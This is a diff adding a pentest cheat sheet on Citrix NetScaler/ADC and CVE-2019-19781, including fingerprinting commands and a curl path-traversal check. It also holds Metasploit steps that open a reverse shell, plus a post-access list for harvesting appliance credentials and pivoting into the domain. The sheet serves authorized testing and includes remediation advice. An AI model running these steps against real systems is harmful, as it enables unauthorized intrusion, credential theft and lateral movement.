@@ -1,0 +1,116 @@
+---
+title: "Citrix NetScaler / ADC Cheat Sheet (CVE-2019-19781)"
+---
+
+<Info>
+**Overview**
+
+**Citrix ADC** (Application Delivery Controller), formerly **NetScaler**, and **Citrix Gateway** (formerly NetScaler Gateway) are network appliances that sit at the edge of corporate networks doing load balancing, SSL offloading, and remote-access VPN. Because they're internet-facing remote-access boxes, a flaw here = unauthenticated foothold straight into the internal network. The big one is **CVE-2019-19781** (a.k.a. "Shitrix") — an unauthenticated **directory-traversal → remote code execution**.
+</Info>
+
+<Info>
+**What it is / why you care**
+
+It's a VPN/gateway appliance. Compromising it usually means: pre-auth RCE on a box that already has a route into the internal network. High-value, frequently unpatched.
+</Info>
+
+---
+
+## How to spot it on a scan
+
+<Tip>
+**Tell-tale signs**
+
+- **Ports 443 / 80** serving a Citrix login portal; sometimes management on **3389**-style ports, but the web portal is the giveaway.
+- URL paths containing **`/vpn/`**, **`/vpns/`**, **`/citrix/`**, or a logon page branded *Citrix Gateway* / *NetScaler*.
+- HTTP response headers / cookies like `NSC_` (NetScaler) or `Citrix` in the `Set-Cookie`.
+- TLS cert CN mentioning NetScaler/Citrix/gateway.
+</Tip>
+
+```bash
+# Fingerprint the web service
+curl -sik https://<TARGET>/ | grep -iE 'citrix|netscaler|nsc_'
+whatweb https://<TARGET>/
+
+# nmap service + the CVE detection script (see below)
+sudo nmap -p443 -sV --script ssl-cert <TARGET>
+```
+
+---
+
+## CVE-2019-19781 — the appliance-killer
+
+<Warning>
+**Impact**
+
+**Unauthenticated** attacker → **arbitrary code execution**. Affects ADC/Gateway **10.5, 11.1, 12.0, 12.1, 13.0** (all builds on those versions). Disclosed 2019-12-17.
+</Warning>
+
+**Root cause:** a path-traversal in the VPN handler lets you reach files and write/execute a template outside the intended directory.
+
+### Detect it (manual)
+
+The vuln is confirmable by reaching a config file through the traversal — a `200` response containing `[global]` / `lmhosts` means **vulnerable**:
+
+```bash
+curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
+```
+
+- A normal/patched box returns 403 or an error; a vulnerable one leaks the SMB config.
+
+### Detect it (nmap NSE)
+
+The raw detection script that used to live in this note has been kept alongside it as **`Citrix-NetScaler-CVE-2019-19781.nse.bak`** (in this same `Network Services` folder). To use it:
+
+```bash
+# copy into nmap's script dir (or point at it directly), then:
+sudo nmap -p443 --script=http-citrix-cve-2019-19781 <TARGET>
+```
+
+- The script requests `/vpn/../vpns/cfg/smb.conf` over TLS and flags `VULN` when the body matches `[global]` + `lmhosts` — exactly the manual check above, automated.
+
+### Exploit it
+
+<Warning>
+**Lab/authorized use only**
+
+Public PoCs write a malicious XML template via the traversal, then trigger it to run a command (reverse shell). Metasploit ships `exploit/linux/http/citrix_dir_traversal_rce`.
+</Warning>
+
+```bash
+msfconsole -q
+use exploit/linux/http/citrix_dir_traversal_rce
+set RHOSTS <TARGET>
+set LHOST <YOUR_VPN_IP>
+run
+```
+
+---
+
+## After access — what to do
+
+1. You typically land as the **`nobody`** user on FreeBSD-based firmware — enumerate for stored creds and the appliance config.
+2. Check `/flash/nsconfig/` and `/var` for configs, saved credentials, and session files.
+3. **Reuse credentials** — gateway appliances often hold AD service-account creds used for LDAP auth → pivot into the domain.
+4. Note it's an **edge device with internal routes** → ideal pivot point into the internal network.
+
+<Note>
+**Remediation (for the report)**
+
+Patch to a fixed build; until then apply Citrix's responder-policy mitigation. Rotate any credentials configured on the appliance — assume they're compromised.
+</Note>
+
+---
+
+## Quick reference
+
+| Item | Value |
+|------|-------|
+| Product | Citrix ADC / NetScaler / Citrix Gateway |
+| Typical ports | 80, 443 (web portal) |
+| Spot it | `/vpn/`, `/vpns/`, `/citrix/` paths; `NSC_` cookies; Citrix-branded login |
+| CVE | CVE-2019-19781 ("Shitrix") |
+| Effect | Unauth path-traversal → RCE |
+| Manual check | `curl -sk https://<T>/vpn/../vpns/cfg/smb.conf` → leaks `[global]` |
+| Metasploit | `exploit/linux/http/citrix_dir_traversal_rce` |
+| Ref | https://support.citrix.com/article/CTX267027 |
